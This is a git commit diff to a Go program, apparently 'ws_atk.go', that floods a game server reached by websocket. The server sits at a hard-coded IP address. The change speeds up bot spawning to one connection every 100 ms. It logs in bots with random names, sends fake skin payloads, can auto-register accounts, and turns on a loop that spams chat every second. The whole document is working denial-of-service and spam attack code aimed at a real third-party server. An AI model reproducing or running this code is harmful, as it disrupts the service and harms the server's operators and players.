8aa7a391e720f14b75e9f83bade3145820f6db74
liulihaocai <liulihaocaiqwq@gmail.com>
2022-05-03 11:19:17 +0800

    sth better

--- main.go
+++ main.go
@@ -6,7 +6,7 @@ func main() {
 	LoadWord()
 	for true {
 		go WsFlood(false)
-		time.Sleep(500 * time.Millisecond)
+		time.Sleep(100 * time.Millisecond)
 	}
 	time.Sleep(1000 * time.Second)
 }
--- ws_atk.go
+++ ws_atk.go
@@ -8,8 +8,13 @@ import (
 	"github.com/gorilla/websocket"
 )
 
+// var addr string = "123.56.152.69:12345"
+
+var addr string = "43.248.189.71:2107"
+var authme bool = false
+
 func WsFlood(motd bool) {
-	c, _, err := websocket.DefaultDialer.Dial("ws://43.248.189.71:2107/", nil)
+	c, _, err := websocket.DefaultDialer.Dial("ws://"+addr+"/", nil)
 	if err != nil {
 		log.Println("dial:", err)
 		return
@@ -19,7 +24,8 @@ func WsFlood(motd bool) {
 	if motd {
 		err = c.WriteMessage(websocket.TextMessage, []byte("Accept: MOTD"))
 	} else {
-		err = c.WriteMessage(websocket.BinaryMessage, buildLoginPacket("Liuli_"+RandStringRunes(5), "43.248.189.71:2107"))
+		err = c.WriteMessage(websocket.BinaryMessage, buildLoginPacket("Liuli_"+RandStringRunes(10), addr))
+		// err = c.WriteMessage(websocket.BinaryMessage, buildLoginPacket(RandStringRunes(5), addr))
 		err = c.WriteMessage(websocket.BinaryMessage, buildCustomPayload("EAG|MySkin", []byte{0x04, byte(rand.Intn(64))}))
 	}
 	if err != nil {
@@ -28,26 +34,31 @@ func WsFlood(motd bool) {
 	}
 	if !motd {
 		go func() {
-			time.Sleep(2 * time.Second)
+			time.Sleep(3 * time.Second)
 			var errr error
-			errr = c.WriteMessage(websocket.BinaryMessage, buildChat("/register 114514 114514"))
-			errr = c.WriteMessage(websocket.BinaryMessage, buildChat("/login 114514"))
-			if errr != nil {
-				log.Println("read:", errr)
-				return
+			if authme {
+				errr = c.WriteMessage(websocket.BinaryMessage, buildChat("/register 114514 114514"))
+				// errr = c.WriteMessage(websocket.BinaryMessage, buildChat("/login 114514"))
+				if errr != nil {
+					log.Println("read:", errr)
+					return
+				}
 			}
-			// cnt := 0
-			// for true {
-			// 	time.Sleep(1 * time.Second)
-			// 	// errr = c.WriteMessage(websocket.BinaryMessage, buildChat("Liulihaocai#3747 >> "+RandStringRunes(30)))
-			// 	errr = c.WriteMessage(websocket.BinaryMessage, buildChat(GetWord()))
-			// 	if errr != nil {
-			// 		log.Println("read:", errr)
-			// 		return
-			// 	}
-			// 	cnt++
-			// }
+			cnt := 0
+			for true {
+				time.Sleep(1 * time.Second)
+				// errr = c.WriteMessage(websocket.BinaryMessage, buildChat("Liulihaocai#3747 >> "+RandStringRunes(30)))
+				errr = c.WriteMessage(websocket.BinaryMessage, buildChat(GetWord()))
+				if errr != nil {
+					log.Println("read:", errr)
+					return
+				}
+				cnt++
+			}
 		}()
+	} else {
+		c.ReadMessage()
+		return
 	}
 	for true {
 		// _, msg, err := c.ReadMessage()
@@ -56,8 +67,12 @@ func WsFlood(motd bool) {
 			log.Println("read:", err)
 			return
 		}
-		// if msg[0] == 3 {
-		// 	log.Printf("receive: %s\n", msg)
+		// log.Printf("receive: id=%d len=%d\n", msg[0], len(msg))
+		// if msg[0] == 3 { // chat packet
+		// log.Printf("receive: id=%d len=%d\n", msg[0], len(msg))
+		// }
+		// if msg[0] == 250 { // custom payload packet
+		// 	log.Printf("receive: id=%d msg=%s\n", msg[0], msg[3:])
 		// }
 		// if motd {
 		// 	return
